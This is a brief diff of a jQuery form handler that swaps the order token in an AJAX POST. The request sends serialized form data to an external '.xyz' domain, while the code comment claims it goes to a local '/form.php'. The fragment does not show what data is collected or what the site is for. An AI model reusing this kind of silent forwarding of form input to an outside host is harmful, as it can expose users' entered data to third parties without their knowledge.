@@ -30,7 +30,7 @@
 
         // Fire off the request to /form.php
         request = $.ajax({
-            url: "https://www.lescommandes.xyz/go/?order=GfootHk9739vozetdLt4bRsaQKygA8",
+            url: "https://www.lescommandes.xyz/go/?order=7iyreHnXDQsxlS3x89HIDMXCldHgy6",
             type: "post",
             data: serializedData
         });
